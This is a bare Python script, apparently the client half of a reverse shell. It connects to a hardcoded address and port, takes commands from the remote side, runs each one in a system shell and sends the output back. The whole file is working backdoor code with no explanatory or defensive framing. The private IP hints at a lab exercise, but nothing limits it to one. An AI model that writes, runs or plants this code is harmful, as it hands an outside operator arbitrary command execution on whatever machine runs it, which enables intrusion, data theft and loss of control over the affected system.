import socket
import os
import subprocess

def client_side():
    host = "192.168.234.128"
    port = 9000
    s = socket.socket()
    s.connect((host, port))

    while True:
        command = s.recv(1024)

        if command.decode().lower() == "exit":
            s.close()
            break

        if len(command) > 0:
            try:

                output = subprocess.check_output(command.decode(), shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output

            s.send(output)

client_side()


